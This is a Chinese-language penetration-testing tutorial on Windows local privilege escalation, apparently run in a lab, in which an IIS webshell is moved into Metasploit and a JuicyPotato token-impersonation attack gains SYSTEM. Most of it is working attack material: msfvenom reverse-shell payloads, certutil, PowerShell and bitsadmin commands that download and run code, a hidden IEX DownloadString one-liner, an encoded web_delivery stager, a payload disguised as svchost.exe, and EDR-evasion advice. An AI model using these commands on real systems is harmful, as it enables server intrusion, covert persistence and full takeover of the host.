---
title: Windows 提权
date: 2026-08-13 16:00:00
cover: https://img.jasmine-iris.top/posts/Windows-提权/cover.webp
categories:
  - 内网渗透
tags:
  - 提权
description: Windows 本地提权实战：蚁剑转MSF、土豆提权、MS16-032内核漏洞、BypassUAC
---

# 1. 蚁剑 Webshell 转移至 Metasploit
## 1.1 为什么要转 MSF？
蚁剑提供基础的文件管理和命令执行，但 Metasploit 的 Meterpreter 提供更强大的后渗透能力：

| 能力 | 蚁剑 | Meterpreter |
| :---: | :---: | :---: |
| 文件管理 | ✓ | ✓ |
| 命令执行 | ✓ | ✓ |
| 提权模块 | ✗ | ✓ (bypassuac, getsystem) |
| 进程迁移 | ✗ | ✓ |
| 哈希导出 | ✗ | ✓ (hashdump, kiwi) |
| 端口转发 | ✗ | ✓ (portfwd) |
| 键盘记录 | ✗ | ✓ |
| 屏幕截图 | ✗ | ✓ |
| 持久化 | ✗ | ✓ |

---

# 2. 如何将 蚁剑 Webshell 转移至 MSF？
### 前置环境说明
攻击端：Kali Linux（IP：192.168.23.131）

目标端：Windows Server 2008 R2 IIS 网站服务器（内网互通）（IP：192.168.23.138）

目标初始权限：通过上传漏洞拿到 ASPX 一句话木马，可用蚁剑连接

### 阶段一：拿到 Web 入口（蚁剑连接）
 Web 入口：**对外开放的网站页面 / 网页服务**，是外网唯一能访问到内网的通道  

1. 利用网站上传漏洞，将一句话木马（aspx 格式）上传至网站可执行目录：`C:\inetpub\wwwroot`（IIS 默认网站根目录路径）
2. 蚁剑填入木马访问地址、连接密码，建立连接，连上之后可以：
+ 文件读写：上传 / 下载服务器文件
+ 终端命令执行：运行 cmd、PowerShell 指令

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602634127_raw8pi.webp)

### 阶段二：两种方式获取 Meterpreter

**<u>方案 1：生成 exe 上传执行</u>**

适用场景：PowerShell 被禁用或 web_delivery 不可用 → 才选择生成 exe 文件上传

**步骤 1：Kali 生成 64 位 Windows 反弹 EXE 载荷，启动监听**

```bash
# 1.生成 payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.131 LPORT=4444 -f exe > payload.exe

# 2.启动监听
msfconsole -q	
# 3.加载监听模块
use exploit/multi/handler	
# 4.配置载荷、监听IP、端口
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.23.131
set LPORT 4444
# 5.执行
run
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602636764_2itb50.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602638433_vh21om.webp)

**步骤 2：把 payload.exe 传到目标服务器**

蚁剑中操作：

注：Temp 目录是系统临时文件夹，写入权限默认放开，适合存放恶意程序；

**方式 ①图形界面上传**  
在蚁剑文件管理界面，进入路径 `C:\Windows\Temp\`，将需要上传的文件拖动到这里。切换到蚁剑终端，输入程序完整路径执行文件。

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602641264_915n92.webp)

**方式 ②Kali 启动 Apache2 网页服务，存放文件**

```bash
# 将exe移动到Apache默认网页根目录
sudo mv payload.exe /var/www/html/
# 启动Apache后台服务
sudo systemctl start apache2
```

```bash
certutil -urlcache -split -f "http://192.168.23.131/payload.exe" C:\Windows\Temp\payload.exe
```

```bash
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.23.131/payload.exe','C:\Windows\Temp\payload1.exe')
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602642900_ntkwe5.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602644275_p2ndl2.webp)

如果不用 Apache，用 `python3 -m http.server 8080` 启动简易网页服务，端口就变成 8080，链接要写成 `http://192.168.23.131:8080/payload.exe`，原理完全一致。  如下：

**方式 ③Python临时HTTP服务**

把生成的 `payload.exe` 放到任意文件夹里，打开终端进入这个目录。 当前文件夹内所有文件，都能通过 `http://KaliIP:端口/文件名` 下载。端口 8080 可以随便改  

执行启动命令：

```bash
# 开启8080端口网页服务 
python3 -m http.server 8080
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602646014_qyqcsx.webp)

```bash
certutil -urlcache -split -f "http://192.168.23.131:8080/payload.exe" C:\Windows\Temp\svchost.exe
```

参数详解：

+ certutil：Windows 自带证书工具，用于网络文件下载，不会被基础防火墙拦截
+ 末尾路径：下载保存位置，命名 svchost.exe 模仿系统进程，降低警惕性

```bash
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.23.131:8080/payload.exe','C:\Windows\Temp\svchost1.exe')
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602648173_ohvwya.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602649644_kr5ieo.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602651396_araj7l.webp)

> ## Apache2  vs Python临时HTTP服务
> ### 一、基础属性差异
> 1. **程序定位**  
Apache2：专业成熟的Web服务器软件，Kali系统预装的标准后台服务，多用于搭建正式网站、长期文件共享；  
Python http.server：Python自带的轻量化临时文件共享工具，仅用来临时传输文件，不属于商用网页服务。
> 2. **默认端口**  
Apache2：标准HTTP 80端口（网页默认端口），访问链接无需填写端口：  
`http://192.168.23.131/payload.exe`  
Python http.server：默认8080非标准端口，链接必须携带端口号，否则无法访问：  
`http://192.168.23.131:8080/payload.exe`
> 3. **文件存放要求**  
Apache2：有强制固定目录：文件必须移动至 `/var/www/html/` 目录下才能被下载，操作该文件夹文件需要sudo管理员权限；  
Python http.server：无固定路径：你在哪个文件夹执行启动命令，哪个文件夹就是下载根目录，生成的载荷文件无需挪动，直接使用即可。
>
> ### 二、运行生命周期
> Apache：系统级后台常驻服务  
执行启动命令后，服务挂载在系统后台运行，**关闭终端窗口、注销Kali账户都不会停止**；下次开机可设置自启动，适合反复练习渗透。  
关闭需要手动输入命令：`sudo systemctl stop apache2`
>
> Python服务：依附当前终端窗口运行  
服务进程绑定你打开的黑框终端，**一旦关闭这个终端页面，网页服务瞬间终止**，目标再也无法下载任何文件；用完直接关掉窗口就行，无需手动关闭命令。
>
> ### 三、相同点
> 1. 都可以配合certutil下载exe、也可以给PowerShell拉取ps1脚本；
> 2. 下载、反弹Meterpreter、后续提权整套流程逻辑没有区别；
> 3. 内网互通环境下，下载速度基本一致。
>

**步骤 3：运行 EXE，获取反弹会话**

```plain
C:\Windows\Temp\payload.exe
```

程序运行后，目标主动向外发起 TCP 连接，连接 Kali 4444 端口，msf 监听端收到连接，弹出 Meterpreter 交互窗口。

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602654090_wlxced.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602655820_a7ivul.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602658143_7g7upy.webp)

**<u>方案 2：PowerShell 无文件落地</u>**

脚本仅加载至内存运行，规避磁盘查杀。

**方式①：Kali 生成反射型 PowerShell 脚本**

**步骤 1：生成PowerShell payload**

```plain
# 攻击机生成 PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.131 LPORT=5555 -f psh-reflection > payload.ps1
```

`-f psh-reflection`：采用**内存反射 DLL 注入**，代码运行全程不会落地文件到磁盘，全部加载在内存中运行，规避 EDR 磁盘文件查杀；

普通 `-f ps` 生成的脚本是明文代码，运行逻辑简单，极易被 EDR 行为规则拦截。

EDR（Endpoint Detection and Response）：装在 Windows 服务器、电脑本地的**高级安全杀毒软件**，比普通 360、Windows Defender 强大得多，一般企业内网、政企服务器都会部署。 

普通杀毒：只查**硬盘上的恶意文件**（exe、病毒程序） 。

EDR：全程监控电脑**所有运行行为、内存操作、进程动作、命令执行。**

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602659593_i8fjp7.webp)

**步骤 2：开启 Apache 网页服务**

```bash
# 1. 移动文件到apache网站目录（需要sudo）
sudo mv payload.ps1 /var/www/html/

# 2. 进入网站目录
cd /var/www/html

# 3. root权限修改文件权限
sudo chmod 777 payload.ps1

# 4. 启动apache服务
sudo systemctl start apache2

#补充：关闭apache服务
sudo systemctl stop apache2
```

访问地址：`http://192.168.23.131/payload.ps1`

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602661346_6mkqyd.webp)

**步骤 3：启动监听**

```bash
# 1.启动监听
msfconsole -q	
# 2.加载监听模块
use exploit/multi/handler	
# 3.配置载荷、监听IP、端口
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.23.131
set LPORT 5555
# 4.执行
run
```

**步骤 4：蚁剑终端执行完整 PowerShell 一句话命令**

```plain
powershell -nop -w hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.23.131/payload.ps1')"
```

| 参数 | 详细作用 |
| --- | --- |
| `-nop` | 不加载用户 PowerShell 配置文件，减少系统日志生成 |
| `-w hidden` | 后台静默运行，不会弹出黑色 PowerShell 窗口 |
| `-exec bypass` | 绕过 Windows 默认 PowerShell 执行策略（系统默认禁止运行脚本） |
| `DownloadString()` | 从远程 HTTP 地址拉取 ps1 脚本文本内容 |
| `IEX` | 将拉取的字符串在内存中直接解析执行 |

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602663115_wnvf1c.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602665115_ftwqao.webp)

**方式②：使用 web_delivery 的 PowerShell 输出**

```bash
# 打开MSF控制台
msfconsole -q

# 快速查找模块
search web_delivery
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602666828_8upiqy.webp)

```bash
# 加载模块
use exploit/multi/script/web_delivery

# 选择输出格式
# 查看所有目标编号，确认powershell数字
show targets

# 指定目标：Windows PowerShell内存执行
set TARGET 2

# 查看全部参数，校验所有配置
show options

# 配置64位反弹载荷
set payload windows/x64/meterpreter/reverse_tcp

# Kali本机IP
set LHOST 192.168.23.131

# 设置端口（注意避免端口冲突）
set LPORT 6666

# 启动模块
run
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602668763_fhwr35.webp)

 复制输出的整段 powershell 代码，粘贴到蚁剑终端执行。  

```bash
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABlAE4APQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZQBOAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZQBOAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIAMwAuADEAMwAxADoAOAAwADgAMAAvAEsAVABrAE4AdQBmAG4ASgBoAEsAQgB3AGsAdgAvAG4AdAA4ADMAQQBvAEkAcABOAHIAOQBlADMATAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIAMwAuADEAMwAxADoAOAAwADgAMAAvAEsAVABrAE4AdQBmAG4ASgBoAEsAQgB3AGsAdgAnACkAKQA7AA==
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602671085_q2btal.webp)

`Meterpreter session 1 opened`表明已经拿到目标服务器完整系统权限，会话编号：**1**

1. 进入被控主机会话

```plain
sessions -i 1
```

回车后命令前缀会从 `msf >` 变成 `meterpreter >`，代表进入服务器内部。

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602673174_xjki44.webp)

**补充：**

`**show targets**`** VS**`** show options**`

1. **show targets**

 查看这个模块所有可选择的目标类型、对应的数字编号  

| Id | 名称 | 用途 | 使用 |
| --- | --- | --- | --- |
| 0 | Python | 生成 Python 一句话载荷 | Linux/mac 用 |
| 1 | PHP | PHP 网页一句话 | 网站渗透用 |
| 2 | PSH | PowerShell 简写命令（内存加载无落地文件） | Windows powershell 上线用 |
| 3 | Regsvr32 | 绕过 PowerShell 防火墙、Defender 拦截 | Powershell 被封禁时备选 |
| 6 | PSH (Binary) | 完整 PowerShell 二进制载荷 | 兼容性更强 |

2. **show options **

 查看所有需要配置的参数：LHOST、LPORT、PAYLOAD、TARGET 等全部配置项  

### 阶段三：Meterpreter 会话基础操作
```plain
meterpreter > sysinfo # 系统信息
meterpreter > getuid # 当前用户
meterpreter > getprivs # 查看权限
meterpreter > ps # 进程列表
meterpreter > migrate <PID> # 迁移进程(推荐迁移到稳定进程)
meterpreter > background # 后台会话
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602674786_oa599q.webp)

---

### 阶段四：Windows 本地提权
### 阶段五：提权后后渗透操作
---

# 3. 提权

## ![](https://img.jasmine-iris.top/posts/Windows-提权/1786602676529_gx2fni.webp)

## 方法一：Token 模拟(SweetPotato / JuicyPotato)

### 1. JuicyPotato/SweetPotato 是什么？
#### 1.1 基础共性
二者都属于 **Windows 本地权限提升工具（土豆系列提权工具）**

**核心功能**：在拥有 `SeImpersonatePrivilege（身份模拟权限）` 的低权限账户下（IIS站点账户、数据库服务账号等），窃取系统最高身份令牌，把权限提升至 Windows 顶级权限：**NT AUTHORITY\SYSTEM**。

**必备前提**：执行 `whoami /priv` 查看权限，`SeImpersonatePrivilege 已启用` 才可提权；  
网站运行账户默认开启该权限，是Web渗透最常用提权手段。

**底层通用原理**：借助Windows RPC、系统服务的NTLM认证机制，诱导SYSTEM权限的系统服务主动回连，劫持其身份凭证令牌，复用令牌创建程序，从而拿到系统权限。

#### 1.2 JuicyPotato（多汁土豆）
1. 诞生背景

RottenPotato（烂土豆）迭代升级版，Windows提权经典老牌工具，网安教学、CTF、老旧靶机标配工具。

2. 利用方式

仅依靠 **DCOM组件漏洞** 完成令牌劫持。

3. 适配操作系统

✅ 完美兼容：Windows 7、Windows Server 2008 / 2012、Win10 1809 之前早期版本  
❌ 局限性：Win10 1809之后、Server2019及以上新版系统，微软补丁封堵DCOM漏洞，基本无法使用。

4. 使用特点

1. 需要手动指定监听端口、COM组件ID（CLSID），需要简单配置参数；
2. 在未打补丁的Win2008环境运行极其稳定；
3. 只能启动CMD、反弹shell等指定程序。

常用执行命令

```plain
JuicyPotato.exe -l 1337 -p cmd.exe -t *
```

#### 1.3 SweetPotato（甜土豆）
1. 诞生背景

微软不断封堵DCOM漏洞后推出的整合型工具，为了解决多汁土豆新版系统无法利用的问题。

2. 利用方式

内置4套提权链路，自动依次尝试：  
DCOM、EfsRpc、WinRM、PrintSpoofer（打印后台服务漏洞）  
一条利用通道被补丁拦截，会自动切换下一种，容错率极高。

3. 适配操作系统

全系列Windows：Win7 ~ Win11、Windows Server 2008 ~ Server 2022，老旧、新服务器都可以尝试。

4. 使用特点

1. 一键自动化运行，无需手动填写端口、CLSID参数，新手友好；
2. 依靠打印服务漏洞，即便DCOM被封禁，依旧可完成提权；
3. 实战内网渗透首选工具。

常用执行命令

```plain
SweetPotato.exe -p cmd.exe
```

#### 1.4 对比
| 对比维度 | JuicyPotato | SweetPotato |
| --- | --- | --- |
| 利用途径 | 仅DCOM单一方式 | 多漏洞方式集成，自动切换 |
| 系统兼容 | 仅老版Windows（2008首选） | 新旧所有Windows全覆盖 |
| 操作难度 | 需要配置参数，稍繁琐 | 一键执行，简单易用 |
| 适用场景 | Win2008靶场 | 真实企业内网、各类新版服务器 |

#### 1.5 渗透流程中的位置
蚁剑连接网站（低权限）→ 上传土豆工具至服务器临时目录 → 运行工具提权至SYSTEM → 抓取账号密码、内网漫游、搭建后门。

### 2. 适用性验证
验证 SeImpersonatePrivilege：

```plain
meterpreter > getprivs
# 关键输出:
SeImpersonatePrivilege
SeImpersonatePrivilege Impersonate a client after authentication Enabled
```

只要 IIS 以 NETWORK SERVICE 或 ApplicationPoolIdentity 运行，必定拥有此权限。

### 3. 漏洞原理
#### 3.1 这不是Bug，是设计缺陷
SweetPotato / JuicyPotato 利用的不是某个具体 CVE 漏洞，而是 Windows 架构中两个设计特性组合造成的权限边界突破：

| 特性 | 描述 | 设计的初衷 |
| --- | --- | --- |
| SeImpersonatePrivilege | 允许服务账户 "扮演" 连接它的客户端 | 让 IIS 模拟远程用户，以用户身份访问文件 |
| COM 激活回调 | 激活 COM 对象时可以指定回调管道 | 让 COM 客户端和服务端建立双向通信 |

问题出在：这两个特性单独使用都没问题，但结合起来就产生了越权——NETWORK SERVICE 可以让 SYSTEM 来连接自己，然后模拟 SYSTEM。

#### 3.2 SeImpersonatePrivilege 为什么是"漏洞"
**正常场景(IIS 的预期用法)：**

`外网普通访客 → HTTP访问网站 → IIS进程(NETWORK SERVICE低权限账户) → 模拟访客低权限身份读写服务器文件`

规则约束：IIS 模拟之后，权限只会变得更低，只能执行访客允许的操作，无法向上获取更高权限，全程安全无害。

**攻击场景(反向利用)：**  
攻击者已经拿下了 IIS 的 NETWORK SERVICE 低权限账号，反向利用模拟机制：

1. 攻击者调用 COM 组件，跟系统服务控制器（SCM）通信
2. 让 SCM 启动一个 SYSTEM 最高权限 的系统后台进程
3. 诱导这个 SYSTEM 进程主动反向连接攻击者预先搭建的管道端口
4. 进程发起身份认证时，攻击者劫持认证令牌，借用令牌模拟 SYSTEM 身份。最终结果：低权限账户 → 提升至系统顶级 SYSTEM 权限

缺陷：

1. SeImpersonatePrivilege **没有限制"只能模拟比自己权限低的用户"**。  
只要你拥有这个权限，你就可以模拟任何连接你的人，包括 SYSTEM。
2. SCM 在转发回调地址时，**没有验证回调目标**是否可信。攻击者可以指定任意管道名，而 SYSTEM 进程会无条件连接。

### 4. 土豆提权完整权限流转
#### T0 初始状态（提权前置条件）
攻击者当前身份：`NETWORK SERVICE`（IIS网站运行低权限账户）  
核心拥有特权：`SeImpersonatePrivilege`（身份模拟权限）  
✅ 必备基础：没有这个权限，整套流程无法启动。

#### T1：攻击者搭建接收通道
操作：创建**命名管道** `\\.\pipe\evil`，并持续监听等待客户端接入

+ 命名管道：Windows进程间通信的一种通道，可以实现两个进程互相收发数据；
+ 作用：预留一个连接入口，专门用来接收后续SYSTEM权限进程的主动连接。

#### T2：调用COM接口，唤起SYSTEM权限进程
调用系统函数：`CoGetInstanceFromIStorage()`  
内部流转逻辑：

1. 函数提交请求给 **SCM（服务控制管理器，Windows系统核心服务管理组件）**
2. SCM根据传入的CLSID（COM组件唯一编号），启动一个**默认以SYSTEM最高权限运行的COM系统进程**
3. 攻击者提前指定回调地址：让刚启动的SYSTEM进程，必须去连接刚才创建的管道 `\\.\pipe\evil`

核心漏洞点：SCM不会校验管道地址是否安全，无条件听从攻击者指定的回调路径。

#### T3：SYSTEM进程接入管道，窃取身份令牌
1. SYSTEM权限的COM进程主动连上攻击者监听的命名管道；
2. 攻击者调用API：`ImpersonateNamedPipeClient()`
3. 效果：利用SeImpersonatePrivilege特权，直接模拟管道客户端（SYSTEM进程）身份  
👉 此刻攻击者自身线程的身份令牌（Token）已经临时变成 **SYSTEM**  
⚠️ 局限：这只是**线程临时令牌**，不能直接用来创建新程序，必须转换格式。

#### T4：复制令牌，转换为进程主令牌
调用函数：`DuplicateTokenEx()`

+ 将线程层面的临时模拟令牌，复制、转换为 **Primary Token（主令牌）**
+ 主令牌：Windows允许用来创建全新进程的标准身份凭证，具备完整的SYSTEM权限。

#### T5：使用SYSTEM令牌启动新程序，提权收尾
调用函数：`CreateProcessWithToken()`  
传入上一步拿到的SYSTEM主令牌，启动CMD、反弹Shell等任意程序；  
最终结果：新诞生的进程全程以 **NT AUTHORITY\SYSTEM** 系统最高权限运行，本地权限提升完成。

**总结**

低权限账号开管道监听 → 调用系统服务拉起SYSTEM进程诱导其连管道 → 模拟窃取SYSTEM令牌 → 转换令牌格式 → 用最高令牌启动程序，实现提权。

### 5. 实操流程
#### <u>方案 A：MSF ms16_075_reflection_juicy (无文件落地 )</u>
无文件落地：**所有提权代码、反弹后门全程仅在目标服务器内存中运行，不会向硬盘写入 exe、bat 等任何实体文件**。

依靠 **反射式 DLL 注入** + MS16-075 漏洞封装模块，Metasploit 把 JuicyPotato 整套令牌劫持逻辑内置集成，无需手动上传土豆工具程序。 底层原理和 JuicyPotato 完全一致：依靠`SeImpersonatePrivilege`权限、指定 CLSID 调用 COM 组件、劫持 SYSTEM 身份令牌完成提权。

模块介绍：

**exploit/windows/local/ms16_075_reflection_juicy**

MS16-075  --> Windows 本地提权漏洞（Juicy Potato 多汁土豆）  

普通用户权限 → 直接提升至 SYSTEM 最高系统权限  

✅ 支持： Windows 7 / Windows Server 2008 R2、Win10 早期版本、Server2012 大部分版本 系统打补丁之前均可利用 

❌ 不支持： 打过 MS16-075 官方安全补丁的系统、新版 Win10/Win11

**步骤：**

1. 前置条件

已经将蚁剑获取的 IIS 低权限会话，成功转入 MSF，得到编号为SESSION 1的 Meterpreter 低权限会话。

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602678433_0szzce.webp)

2. MSF 内执行命令  

```bash
# 后台挂起当前会话，回到 MSF 主控台
background

# 加载多汁土豆提权模块
use exploit/windows/local/ms16_075_reflection_juicy

# 指定要提权的低权限会话
set SESSION 1

# 设置提权成功后反弹会话的载荷
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 填写攻击机Kali地址、监听端口
set LHOST 192.168.23.131
set LPORT 6666

# 填入Win2008 R2高成功率COM组件CLSID
set CLSID {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

# 一键自动执行全套内存提权流程
run
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602680446_5ynxux.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602682444_4a1gkn.webp)

3. run 执行后内部过程
+ MSF 通过现有低权限会话，在目标内存加载提权代码；
+ 调用指定 CLSID 唤起 SYSTEM 权限系统进程，诱导进程回连管道；
+ 劫持、复制 SYSTEM 身份令牌；
+ 内存中直接生成反弹 Shell，回连 Kali 监听端口；
+ MSF 接收全新的 SYSTEM 最高权限 Meterpreter 会话。
4. 核心优势
+ 磁盘无恶意文件留存，杀毒软件无法扫描捕获，隐蔽性极强；
+ 操作简洁，无需编写批处理、上传多个工具文件；
+ 痕迹极少，是 Windows 土豆提权的首选方式。
5. 会话区分

原本的 SESSION 1 依旧是低权限状态，程序运行后会生成独立的新会话，新会话拥有系统最高权限。

**Windows Server 2008 R2 可用 CLSID**

| CLSID | 说明 | 成功率 |
| --- | :---: | :---: |
| {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} | Windows Update | 高 |
| {B52D54BB-4818-4EB9-AA80-F9EAD44A6A39} | Network Setup | 高 |
| {03E0E6C8-364B-49DE-8C5C-41B4E4E6C6C2} | Windows Media Player | 中 |
| {659cdea7-489e-11d9-a9cd-000d56965251} | BITS | 中 |

模块特点：  
反射式 DLL 注入到当前进程，不写入磁盘  
自动遍历 CLSID 直到成功  
成功后返回新的 SYSTEM 权限 Meterpreter 会话

#### 方案 B：JuicyPotato 传统版(有文件落地 ❌)
需要落地的 EXE 和 BAT 文件，杀软可能检测。当方案 A 因 CLSID 不匹配或环境限制不可用时作为备选。

**阶段 1：前置准备**

1. 拿到初始低权限 shell：通过一句话木马、蚁剑连接目标服务器，当前权限`NETWORK SERVICE`（IIS 网站账户，低权限），自带`SeImpersonatePrivilege`模拟权限。
2. MSF 开启监听（等待最高权限木马回连）：

Kali 端打开 Metasploit，配置反向 TCP 监听：

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.23.131  
set LPORT 5555             
run
```

执行后持续等待目标服务器主动反弹连接。

3. 下载 JuicyPotato 工具，上传至目标服务器

```bash
# Kali 下载土豆工具
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
# 在初始 meterpreter 会话里，上传工具到系统临时目录
meterpreter > upload JuicyPotato.exe C:\\Windows\\Temp\\jp.exe
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602684497_i0dwnl.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602687121_ej9h2b.webp)

报错提示说：`/var/www/html/` 目录下找不到 

 这个文件  。因此要把这个文件移动到`/var/www/html/` 目录下。

```powershell
sudo mv JuicyPotato.exe /var/www/html/ 
upload JuicyPotato.exe C:\\Windows\\Temp\\jp.exe
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602688837_ta78yo.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602689883_m52cmk.webp)

上传完成后，目标路径：`C:\Windows\Temp\jp.exe`

4. 生成反弹木马 p.exe

用 msfvenom 生成 Windows 反弹程序，同样上传到 `C:\Windows\Temp\p.exe` 作用：最终提权成功后，以 SYSTEM 权限运行它，反弹最高权限会话到 Kali。

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.131 LPORT=5555 -f exe -o p.exe
```

再上传，和传JuicyPotato 工具一样。

```powershell
sudo mv p.exe /var/www/html 
upload p.exe C:\\Windows\\Temp\\p.exe
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602691670_blwhcs.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602692850_bttjep.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602694864_wctp32.webp)

⭐这里总结一下三种上传文件的方式：

1. **Meterpreter upload 命令**  
条件：已经拿到初始反弹Meterpreter会话  
用法：

```plain
upload Kali本地文件路径 目标Windows存放路径
```

优势：

+ MSF自带功能，稳定；
+ 全程命令行操作，不用切换蚁剑软件；
+ 适合批量上传提权工具、反弹木马、漏洞利用程序，内网渗透最主流方式。
2. **蚁剑图形界面拖拽上传**
+ 条件：Webshell网站权限
+ 操作：本地文件直接拖进服务器目录文件夹
+ 优势：可视化；
+ 局限：大文件容易中断，大量渗透工具上传不如meterpreter便捷。
3. **蚁剑终端CMD命令上传**
+ Kali 开简易网页服务，存放 exe 工具
+ 蚁剑 CMD 里用 certutil/powershell 等命令，从 Kali 地址把文件下载到服务器 C:\Windows\Temp

**<u>PowerShell 下载方式</u>**

```powershell
(New-Object System.Net.WebClient).DownloadFile('远程文件下载地址','Windows本地保存路径')
```

1. 适配范围  
Windows Server2008R2、Win7 默认PS2.0 完美运行，渗透老服务器最稳妥。
2. 结构拆分
+ `.DownloadFile()`：固定下载方法  
+ `(New-Object System.Net.WebClient)`：固定开头，调用.NET 下载类  

```powershell
Invoke-WebRequest -Uri 远程文件地址 -OutFile 本地存储路径
```

1. 适用条件  
PowerShell 3.0及以上系统（Win10、Server2012及新版服务器）
2. 缺点  
Win2008R2默认PS2.0，执行直接报错，不能用
3. 结构拆分
+ `Invoke-WebRequest`：固定请求命令
+ `-Uri`：标记远程网络资源地址
+ `-OutFile`：标记文件存放本地路径

**<u>CMD原生下载命令</u>**

1. certutil（兼容性天花板，2008R2必用）

```plain
certutil -urlcache -split -f 远程下载链接 本地保存路径
```

参数：

+ `-urlcache`：调用缓存下载；
+ `-split -f`：强制写入磁盘文件
+ 优点：所有Windows系统自带，无版本限制，杀毒早期不易拦截

2.  bitsadmin 后台静默下载

```plain
bitsadmin /transfer 自定义任务名 远程下载链接 本地保存路径
```

特点：后台悄悄下载，无窗口弹窗，适合隐蔽渗透

**阶段 2：在目标服务器 CMD 终端执行完整提权命令**

```powershell
echo C:\Windows\Temp\p.exe > C:\Windows\Temp\p.bat && C:\Windows\Temp\jp.exe -l 1337 -p C:\Windows\Temp\p.bat -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602696871_ypnf86.webp)

命令拆分：

1. 生成批处理脚本 p.bat

`echo C:\Windows\Temp\p.exe > C:\Windows\Temp\p.bat`

在磁盘新建脚本文件，内部内容只有一行：`C:\Windows\Temp\p.exe`

功能：被调用时自动运行反弹木马。

2. 运行 JuicyPotato 提权程序

参数详解：

+ `-l 1337`：开启 1337 端口创建命名管道（土豆工具本地端口），等待 SYSTEM 进程接入
+ `-p`：提权后要启动的程序（这里填我们刚写好的 bat 脚本）
+ `-t *`：自动选择令牌复制模式
+ `-c CLSID串`：指定 Win2008 成功率最高的 Windows Update COM 组件 ID，强制以 SYSTEM 权限拉起系统进程

**内部提权流转**

1. 诱导 SYSTEM 权限进程连接管道 → 劫持 SYSTEM 身份令牌
2. 复制令牌为进程主令牌
3. 用 SYSTEM 权限启动 p.bat → 运行 p.exe 反弹木马

**阶段 3：Kali 接收新的 SYSTEM 权限 Meterpreter 会话**

